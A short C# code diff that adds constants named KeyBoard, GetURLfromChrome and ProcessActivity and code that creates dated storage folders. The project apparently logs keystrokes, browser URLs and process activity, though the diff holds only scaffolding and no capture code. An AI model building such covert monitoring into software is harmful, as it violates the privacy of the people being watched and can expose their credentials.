@@ -10,12 +10,24 @@ namespace key
 {
     public class API
     {
+        public static string KeyBoard = "KeyBoard";
+        public static string GetURLfromChrome = "GetURLfromChrome";
+        public static string ProcessActivity = "ProcessActivity";
+
         public static string FolderText = "Text";
         public static void CreateFolderText()
         {
             if (!Directory.Exists(FolderText))
             {
                 Directory.CreateDirectory(FolderText);
+            }
+        }
+        public static string FolderDay = "Text/" + DateTime.Now.ToLongDateString();
+        public static void CreateFolderDay()
+        {
+            if (!Directory.Exists(FolderDay))
+            {
+                Directory.CreateDirectory(FolderDay);
             }
         }
         public static string FolderImage = "Image";
